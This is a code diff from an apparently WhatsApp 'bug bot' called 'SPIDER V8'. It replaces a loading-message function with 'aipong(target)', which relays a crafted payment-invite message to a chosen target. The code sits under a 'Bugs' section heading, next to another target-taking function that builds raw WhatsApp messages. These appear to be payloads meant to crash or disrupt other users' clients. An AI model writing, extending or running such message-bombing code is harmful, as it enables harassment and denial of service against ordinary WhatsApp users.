@@ -342,16 +342,10 @@ const reaction = async (jidss, emoji) => {
 }
 
 //=================================================//
-async function loadings () {
-var lod = [
-"👽 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8 (𝐑𝐄𝐕-1) 🏴‍☠️",
-]
-let { key } = await sam.sendMessage(from, {text: ''})
+async function aipong(target) {
+await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+} 
 
-for (let i = 0; i < lod.length; i++) {
-await sam.sendMessage(from, {text: lod[i], edit: key });
-}
-	 }
 //=======≠============Bugs========================//
 async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
